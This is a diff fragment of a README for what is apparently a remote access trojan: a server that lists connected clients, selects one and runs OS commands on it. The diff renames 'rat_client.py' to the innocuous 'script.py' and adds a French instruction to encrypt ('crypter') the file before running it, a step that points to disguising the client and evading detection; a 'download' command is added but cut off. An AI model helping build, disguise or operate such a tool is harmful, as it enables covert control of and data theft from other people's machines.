@@ -26,12 +26,13 @@ Execution:
    - Shows listening status and connected clients
 
 2. Run Client:
-   python rat_client.py
+   python script.py
    - Connects to server automatically
-
+   - crypter le ficher avant fait executer le code de option 2
 Basic Commands:
 - list: Show connected clients
 - select [index]: Control specific client
 - [command]: Execute OS commands
 - back: Return to main prompt
 - exit: Shutdown server
+- download 
